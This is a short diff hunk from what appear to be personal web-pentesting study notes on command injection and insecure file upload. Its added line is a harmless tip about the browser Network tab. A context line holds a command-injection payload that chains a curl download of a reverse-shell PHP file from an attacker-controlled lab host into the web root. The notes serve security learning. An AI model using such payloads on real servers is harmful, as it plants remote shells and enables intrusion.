@@ -249,6 +249,7 @@ Command: https://tcm-sec.com && curl 192.168.17.133:8080/rev.php > /var/www/html
 
 https://appsecexplained.gitbook.io/appsecexplained/common-vulns/insecure-file-upload
 
+Open the dev tools for that press Q to inspect and go in the Network tab and just reload the website.
 
 
 
